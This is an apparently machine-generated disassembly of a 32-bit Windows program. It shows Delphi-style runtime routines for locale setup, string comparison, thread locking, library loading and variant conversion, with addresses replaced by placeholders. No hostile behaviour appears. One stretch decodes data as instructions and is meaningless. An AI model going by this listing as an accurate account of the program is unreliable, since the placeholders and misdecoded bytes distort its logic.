mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404320#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c300
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408504
mov [ esp ] eax
mov eax ebp
call sub_408504
mov edi eax
mov edx ebp
mov eax esi
call sub_40869c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bef8
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_40869c
mov ebx eax
inc ebx
sub_40c3a0
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c3c8
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c3c8
test eax eax
jne r-xdata
sub_40c3c8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408688
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bef8
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408688
mov edi eax
test edi edi
jne r-xdata
sub_40c408
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c46c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4040c4
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_407ef0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c473
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_40c47c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c408
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c4f4
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c4dc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c47c
pop ecx
push ebp
call sub_40c47c
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402c3c
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c668
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c933
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c4f4
call sub_40ae14
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40ad64
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ea8
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_407ef0
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_407ef0
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40adb0
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40adb0
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_407ef0
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40adb0
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b09c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403ea8
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b09c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403ea8
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40adb0
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40ad64
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403ea8
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40ad64
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403ea8
lea eax [ ebp - 0x8 ]
call sub_403e54
lea eax [ ebp - 0xc ]
call sub_403e54
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_407ef0
test eax eax
jne r-xdata
call sub_40afec
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403eec
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403eec
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4041d4
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4041d4
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40adb0
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c93a
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403e78
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_407ef0
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40ad64
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_407ef0
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403eec
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403eec
jmp r-xdata
sub_40c9e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cb03
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403eec
lea eax [ ebp - 0xc ]
mov edx edi
call sub_403eec
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_407b68
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407b68
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_403eec
mov eax esi
call sub_403e54
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c23c
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cb0a
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403e78
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_404374
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_4041d4
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_404114
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_404374
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_40411c
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404114
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_404374
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_40411c
jmp r-xdata
sub_40cb1c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cbac
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ad18
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbb3
lea eax [ ebp - 0x14 ]
call sub_403e54
retn
sub_40cc04
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408490
mov [ rw-data ] eax
sub_40cc88
push ebx
push esi
push edi
push ebp
call sub_403490
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4030f4
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403478
sub_40ccf0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40ccd8
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cd78
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_4079a4
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40cc78
mov [ ebp ] eax
sub_40cd78
push ebx
mov ebx eax
mov eax ebx
call sub_40ccd8
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40cc78
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cdb8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030d4
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_40ce2c
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_40ceb8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403104
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_40ceb8
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ce74
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40ccf0
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40cc80
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40cc60
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40cc80
test eax eax
je r-xdata
mov eax edi
call sub_40ce74
test bl bl
je r-xdata
mov eax edi
call sub_40cea8
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40cc60
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40cc6c
sub_40cf54
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ccf0
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40cc80
mov eax ebx
call sub_40ce8c
mov eax ebx
call sub_40ce80
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cd68
sub_40cfa4
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40ccf0
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40ce98
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40cc6c
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40cc60
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40ce98
mov eax esi
call sub_40ce8c
sub_40d010
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ccf0
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40cd68
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40cc60
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40ce8c
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40ce8c
sub_40d088
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d0ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d123
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054f4
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4031b8
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d12a
lea eax [ ebp - 0x4 ]
call sub_4054f4
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031b8
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d088
test al al
jne r-xdata
mov al 0x1
sub_40d144
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d1b6
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d198
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404314
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d19f
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d1c8
sbb eax 0x4000000
arpl [ esi ] ax
movsb [ edi ] [ esi ]
ja r-xdata
ja r-xdata
add ah bh
bound eax [ esi ]
jo r-xdata
jns r-xdata
add [ edx + 0x76180046 ] dh
inc esi
add [ edx + 0x76200046 ] ch
inc esi
add [ edx + 0x78cc0046 ] ah
inc esi
add [ edx + 0x761c0046 ] bl
inc esi
dec esp
ja r-xdata
inc esi
add ah dh
bound eax [ esi ]
jo r-xdata
js r-xdata
add [ edx + 0x46 ] ch
add [ eax ] dh
jbe r-xdata
jbe r-xdata
add [ edx + 0x46 ] ah
add ah dl
js r-xdata
ja r-xdata
add [ edx + 0x46 ] bh
add [ eax + 0x74004679 ] al
bound eax [ esi ]
sbb [ ecx + 0x46 ] bh
inc esi
inc esi
add ah ch
bound eax [ esi ]
add [ eax + 0x46 ] bh
add ah ah
bound eax [ esi ]
inc eax
js r-xdata
add [ eax ] al
add [ eax ] cl
bound eax [ esi ]
add [ ebp + 0x46 ] dh
add [ edx ] ah
inc esi
add [ esi + esi * 2 ] ch
inc esi
jne r-xdata
add [ eax ] ch
add [ eax ] al
add [ edx ] bl
inc esi
add [ eax + edi * 2 + 0x46 ] ch
add [ eax ] al
sbb [ edx + 0x46 ] ah
add [ esp + esi * 2 + 0x46 ] bh
bound eax [ esi ]
lodsb [ esi ]
js r-xdata
add [ edx + 0x46 ] bl
add ah ch
js r-xdata
je r-xdata
add [ edx ] dh
inc esi
add [ esp + esi * 2 ] bl
inc esi
add [ edx ] ch
inc esi
add al cl
jbe r-xdata
add ah bl
bound eax [ esi ]
pop eax
jne r-xdata
ja r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] al
inc esi
add [ eax + 0x4674 ] ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] bl
bound eax [ esi ]
jl r-xdata
add [ edx + 0x46 ] dl
add [ eax + 0x75 ] al
inc esi
jne r-xdata
inc esi
add [ esi * 2 + 0x46 ] cl
add [ eax ] al
or [ edx + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
jne r-xdata
add [ edx + 0x796c0046 ] dl
inc esi
jns r-xdata
add ah dl
bound eax [ esi ]
push esp
jbe r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add al bh
popad
inc esi
add [ esi * 2 + 0x46 ] al
add [ eax ] al
hlt
js r-xdata
add [ eax ] al
add [ eax ] al
add ah ch
popad
inc esi
add [ eax ] ch
js r-xdata
add [ eax ] al
add [ eax ] al
bound eax [ esi ]
sub [ esi + 0x46 ] dh
add [ eax ] al
inc esi
add [ eax + edi * 2 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ edx ] dl
inc esi
add al ah
ja r-xdata
inc esi
bound eax [ esi ]
loopne r-xdata
add [ edx + 0x46 ] al
add [ eax + 0x77 ] al
inc esi
jne r-xdata
add [ eax ] al
add [ eax ] al
add ah dh
popad
inc esi
add [ edi + esi * 2 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add al dh
popad
je r-xdata
add [ edx + 0x46 ] cl
add ah ah
je r-xdata
add [ edx + 0x77700046 ] cl
inc esi
ja r-xdata
add ah cl
bound eax [ esi ]
adc [ esi + eax * 2 ] dh
les esp [ edx + 0x46 ]
add [ eax - 0x43ffb98a ] bh
bound eax [ esi ]
and [ edi + 0x46 ] dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add al ah
popad
inc esi
add [ ebp + esi * 2 + 0x46 ] bl
add [ eax ] al
fsub [ ecx + 0x46 ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add ah dl
popad
inc esi
add al dh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add al ch
popad
inc esi
add [ edi + esi * 2 + 0x46 ] cl
add [ eax ] al
in al 0x61
inc esi
ja r-xdata
add [ esp + esi * 2 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add al bl
popad
inc esi
add [ eax + edi * 2 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add ah bl
popad
inc esi
jbe r-xdata
ja r-xdata
add [ edx + 0x774c0046 ] al
inc esi
js r-xdata
add [ eax ] al
add [ eax ] al
add al cl
popad
inc esi
add [ edi + esi * 2 + 0x46 ] dl
je r-xdata
add [ eax ] al
add [ eax ] al
add al dl
popad
inc esi
add [ eax + 0x4675 ] cl
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x74200046 ] bh
inc esi
js r-xdata
add [ eax ] al
add [ eax ] al
add ah al
popad
inc esi
add ah dl
jbe r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add ah bh
popad
inc esi
add [ edi + esi * 2 + 0x46 ] ch
add [ eax ] al
add [ eax ] dl
bound eax [ esi ]
sub [ esi + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
or al 0x62
add [ edx ] bh
inc esi
add ah dh
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x77ffb99f ] dh
ja r-xdata
add [ eax ] al
add [ eax ] al
add al al
popad
inc esi
add al ah
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x60004661 ] bh
js r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x74380046 ] ah
inc esi
js r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x78f40046 ] dh
inc esi
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x77300046 ] ch
inc esi
jne r-xdata
inc esi
add [ esi + esi * 2 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add ah ah
popad
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffb99f ] bl
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004661 ] ch
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x78004661 ] ah
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x772c0046 ] cl
inc esi
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x79ac0046 ] bl
inc esi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + 0x740c0046 ] dl
inc esi
jbe r-xdata
add [ eax ] al
add ah cl
popad
inc esi
add [ esi + esi * 2 + 0x46 ] dh
add [ eax ] al
enter 0x4661 0x0
push esp
add [ eax ] al
add [ ecx + 0x16 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x61 ] ah
inc esi
add [ eax + 0x75 ] cl
inc esi
push ebp
push sub_40d60d
push [ fs : eax ]
mov [ fs : eax ] esp
add [ eax ] al
add [ eax ] al
add [ eax - 0x43ffb99f ] dl
mov edx [ sub_40b738 ]
mov eax rw-data
call sub_40d078
call sub_40cbe4
call sub_40bc60
mov eax rw-data
mov ecx 0x16
add [ eax ] al
add [ eax ] al
add [ eax + 0x4c004661 ] cl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d614
retn
idiv edi
add [ eax ] al
add [ eax ] al
add [ ecx + 0x46 ] ah
add [ esi + esi * 2 ] bh
inc esi
call sub_4048dc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
call sub_403e54
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e14
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e14
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_403e54
mov eax rw-data
call sub_404534
mov eax rw-data
call sub_403e54
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
sub_40d618
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d680
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d687
retn
mov eax sub_40d1c8
call sub_403c00
mov eax r-xdata
call sub_403c28
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bbdc
call sub_40bce0
call sub_40cc04
call sub_40c668
mov eax rw-data
mov edx r-xdata
call sub_403ea8
sub_40d6b8
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d70c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d766
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
